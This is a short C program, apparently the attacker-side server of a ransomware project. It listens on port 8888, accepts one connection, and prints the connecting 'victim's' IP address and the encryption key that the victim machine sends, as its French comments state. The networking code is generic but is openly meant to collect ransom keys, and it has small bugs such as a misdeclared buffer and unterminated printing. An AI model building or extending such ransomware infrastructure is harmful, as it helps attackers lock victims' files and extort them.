#include <stdio.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <string.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <netdb.h>
#define BUFFER_SIZE 1024

void handle_error(){
    printf("Error\n");
    exit(0);
}

int main(void){
    int sockid;
    int server_port = 8888;
    char *server_ip = "127.0.0.1";

    sockid = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in server_addr, client_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    server_addr.sin_addr.s_addr = INADDR_ANY;

    char *buffer[BUFFER_SIZE];
    int n, client_socket;
    int bind_result = bind(sockid, (const struct sockaddr *)&server_addr, sizeof(server_addr));

    if(bind_result<0){
        printf("Error during binding");
    }
    else {
        printf("server listening");
        n = listen(sockid, 1);
        if (n < 0) {
            printf("Error during listen()\n");
            handle_error();
        }
        int len = sizeof(client_addr);
        client_socket = accept(sockid, (struct sockaddr *) &client_addr, &len);

        if (client_socket < 0) {
            printf("Error during accept");
            handle_error();
        }
        printf("Accept connection from %s\n", inet_ntoa(client_addr.sin_addr)); //affichage de l'adresse ip de la victime
        n = recv(client_socket, (char *) buffer, BUFFER_SIZE, MSG_WAITALL);

        printf("key = %s\n",(char *)buffer);
        //reception et affichage de la clé de chiffrage

    }
    char *new_ip = inet_ntoa(client_addr.sin_addr);
    printf("%s", new_ip);
    close(sockid);
    
    
}
